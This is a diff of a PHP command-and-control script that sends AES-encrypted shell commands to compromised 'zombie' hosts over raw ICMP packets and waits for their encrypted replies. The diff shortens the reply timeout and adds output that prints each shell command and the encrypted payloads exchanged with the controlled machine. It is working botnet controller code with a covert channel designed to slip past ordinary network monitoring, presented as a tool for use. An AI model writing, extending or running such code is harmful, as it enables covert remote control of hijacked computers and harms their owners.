@@ -1,4 +1,5 @@
 <?php
+date_default_timezone_set("Asia/Taipei");
 
 if ($argc < 4) {
     echo "用法: php icmp.php <IP> <cmd> <aes_key>\n";
@@ -24,6 +25,7 @@ $ciphertext = openssl_encrypt(
 
 // Base64( IV | ciphertext ) + null terminator
 $payload = base64_encode($iv . $ciphertext) . "\0";
+
 
 // =====================================================
 //  Raw socket
@@ -67,7 +69,7 @@ $packet = $header . $payload;
 socket_sendto($socket, $packet, strlen($packet), 0, $dst_ip, 0);
 
 // =====================================================
-//  等待肉雞回覆（最多 10 秒）
+//  等待肉雞回覆（最多 4 秒）
 // =====================================================
 $start = time();
 
@@ -117,10 +119,11 @@ while (true) {
     $trimmed = trim($reply);
 
     // ★ 加入 DEBUG 輸出，讓你看到到底收到了什麼 (正式使用時可註解掉)
-    //echo "DEBUG: Decrypted: [$trimmed]\n";
+
 
     // checkAlive 回覆
     if (str_starts_with($trimmed, "RJalive,")) {
+
         echo $trimmed . "\n";
         break;
     }
@@ -128,7 +131,13 @@ while (true) {
     // COPY 回覆
     // ★ 修正重點：只要開頭是 "RJcopy," 就視為成功
     if (str_starts_with($trimmed, "RJcopy,")) {
-        echo $trimmed . "\n";
+               echo "[主控->肉雞] shell指令：".$plaintext."
+";
+echo "[主控->肉雞] 加密後ICMP封包payload：".$payload."
+";
+echo "[肉雞->主控] 加密後ICMP封包payload：". $reply_payload."
+";
+        echo "[肉雞->主控] echo明文： ".$trimmed . "\n";
         break;
     }
 
